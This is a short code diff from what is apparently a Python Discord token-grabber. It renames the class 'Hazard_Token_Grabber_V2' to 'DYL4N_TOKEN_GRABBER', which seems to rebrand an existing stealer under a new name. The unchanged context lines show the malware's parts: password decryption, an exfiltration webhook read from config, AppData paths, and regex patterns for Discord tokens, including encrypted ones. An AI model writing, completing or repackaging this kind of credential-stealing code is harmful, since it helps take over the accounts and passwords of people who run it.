@@ -49,7 +49,7 @@ class functions(object):
         except Exception:
             return "Failed to decrypt password"
 
-class Hazard_Token_Grabber_V2(functions):
+class DYL4N_TOKEN_GRABBER(functions):
     def __init__(self):
         super().__init__()
         self.webhook = config.get('webhook')
@@ -57,7 +57,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
+        self.tempfolder = os.getenv("temp")+"\\DYL4N_TOKEN_GRABBER"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
 
@@ -401,4 +401,4 @@ class Hazard_Token_Grabber_V2(functions):
         os.remove(_zipfile)
 
 if __name__ == "__main__" and os.name == "nt":
-    Hazard_Token_Grabber_V2()
+    DYL4N_TOKEN_GRABBER()
